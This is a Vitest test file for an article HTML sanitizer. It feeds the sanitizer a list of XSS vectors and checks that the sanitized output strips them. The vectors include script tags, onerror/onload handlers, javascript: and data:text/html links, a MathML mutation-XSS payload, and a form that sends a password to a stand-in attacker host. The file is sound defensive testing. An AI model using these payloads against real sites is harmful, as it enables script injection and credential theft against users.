// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';

import { sanitizeArticleHtml, sanitizeToFragment } from './sanitize';

const BASE = 'https://daily.example/section/article';

const SAFE_SCHEME = /^(https?:|data:image\/)/;

interface Findings {
  tags: string[];
  eventAttrs: string[];
  urls: string[];
}

function scan(html: string): Findings {
  const fragment = sanitizeToFragment(html, BASE);
  const host = document.createElement('div');
  host.append(fragment);

  const findings: Findings = { tags: [], eventAttrs: [], urls: [] };

  for (const element of host.querySelectorAll('*')) {
    findings.tags.push(element.tagName.toLowerCase());

    for (const attribute of element.attributes) {
      const name = attribute.name.toLowerCase();
      if (name.startsWith('on')) findings.eventAttrs.push(`${element.tagName}:${name}`);
      if (name === 'href' || name === 'src' || name === 'srcset' || name === 'data') {
        findings.urls.push(attribute.value);
      }
    }
  }

  return findings;
}

function expectHarmless(html: string): Findings {
  const findings = scan(html);

  expect(findings.eventAttrs).toEqual([]);
  for (const tag of findings.tags) {
    expect(['script', 'iframe', 'object', 'embed', 'form', 'input', 'style', 'link', 'base', 'meta', 'svg', 'math', 'noscript', 'template']).not.toContain(tag);
  }
  for (const url of findings.urls) {
    expect(url).toMatch(SAFE_SCHEME);
  }

  return findings;
}

const VECTORS: readonly { name: string; payload: string }[] = [
  { name: 'a plain script', payload: '<script>alert(1)</script><p>text</p>' },
  { name: 'a nested script', payload: '<div><p>a</p><script src="https://evil.example/x.js"></script></div>' },
  { name: 'a split script tag', payload: '<scr<script>ipt>alert(1)</scr</script>ipt>' },
  { name: 'img onerror', payload: '<img src="x" onerror="alert(1)" alt="x" />' },
  { name: 'img onerror without quotes', payload: '<img src=x onerror=alert(1)>' },
  { name: 'svg onload', payload: '<svg onload="alert(1)"><circle r="10"/></svg>' },
  { name: 'svg with animate and href', payload: '<svg><a href="javascript:alert(1)"><text>click</text></a></svg>' },
  { name: 'body onload smuggled in the content', payload: '<body onload="alert(1)"><p>text</p></body>' },
  { name: 'a javascript: link', payload: '<a href="javascript:alert(1)">click</a>' },
  { name: 'a javascript: link in mixed case', payload: '<a href="JaVaScRiPt:alert(1)">click</a>' },
  { name: 'a javascript: link with whitespace', payload: '<a href=" \t\njavascript:alert(1)">click</a>' },
  { name: 'a javascript: link with entities', payload: '<a href="&#106;avascript&colon;alert(1)">click</a>' },
  { name: 'a data:text/html link', payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>' },
  { name: 'img data:text/html', payload: '<img src="data:text/html,<script>alert(1)</script>" alt="x" />' },
  { name: 'vbscript:', payload: '<a href="vbscript:msgbox(1)">click</a>' },
  { name: 'iframe srcdoc', payload: '<iframe srcdoc="<script>alert(1)</script>"></iframe>' },
  { name: 'object and embed', payload: '<object data="bad.swf"></object><embed src="bad.swf">' },
  { name: 'meta refresh', payload: '<meta http-equiv="refresh" content="0;url=https://evil.example">' },
  { name: 'base href', payload: '<base href="https://evil.example/"><a href="/account">click</a>' },
  { name: 'a form with an action', payload: '<form action="https://evil.example/steal"><input name="password"><button>OK</button></form>' },
  { name: 'style and an expression in an attribute', payload: '<style>@import url(https://evil.example/x.css)</style><p style="background:url(javascript:alert(1))">text</p>' },
  { name: 'autofocus onfocus', payload: '<input autofocus onfocus="alert(1)">' },
  { name: 'details ontoggle', payload: '<details ontoggle="alert(1)" open><summary>a</summary>b</details>' },
  { name: 'srcset alongside src', payload: '<img src="https://cdn.example/a.png" srcset="javascript:alert(1) 1x" alt="a" />' },
  { name: 'a template with a script', payload: '<template><script>alert(1)</script></template><p>text</p>' },
  { name: 'noscript', payload: '<noscript><p>no js</p></noscript>' },
  { name: 'mathml mXSS', payload: '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></mtext></math>' },
  { name: 'a conditional comment', payload: '<!--[if IE]><script>alert(1)</script><![endif]--><p>text</p>' },
  { name: 'a double-encoded attribute', payload: '<a href="%6a%61%76%61%73%63%72%69%70%74:alert(1)">click</a>' },
];

describe('XSS vectors', () => {
  for (const vector of VECTORS) {
    it(`blocks: ${vector.name}`, () => {
      expectHarmless(vector.payload);

      const clean = sanitizeArticleHtml(vector.payload, BASE).html.toLowerCase();
      expect(clean).not.toContain('<script');
      expect(clean).not.toContain('javascript:');
      expect(clean).not.toContain('vbscript:');
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('onload');
      expect(clean).not.toContain('srcdoc');
    });
  }
});

describe('what survives sanitization', () => {
  it('the payload text alone, without executable markup', () => {
    const findings = scan('<p>before</p><script>alert(1)</script><p>after</p>');
    expect(findings.tags).toEqual(['p', 'p']);
  });

  it('a data: image passes only as an image', () => {
    const pixel =
      'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
    const findings = scan(`<img src="${pixel}" alt="pixel" /><a href="${pixel}">click</a>`);

    expect(findings.urls).toEqual([pixel]);
    expect(findings.tags).toEqual(['img', 'a']);
  });

  it('a link whose address was stripped does not pretend to work', () => {
    const fragment = sanitizeToFragment('<a href="javascript:alert(1)">click</a>', BASE);
    const host = document.createElement('div');
    host.append(fragment);

    const link = host.querySelector('a');
    expect(link?.hasAttribute('href')).toBe(false);
    expect(link?.textContent).toBe('click');
  });

  it('an image whose address was stripped disappears along with its frame', () => {
    const findings = scan('<p>a</p><img src="ftp://server/x.png" alt="x" />');
    expect(findings.tags).toEqual(['p']);
  });
});
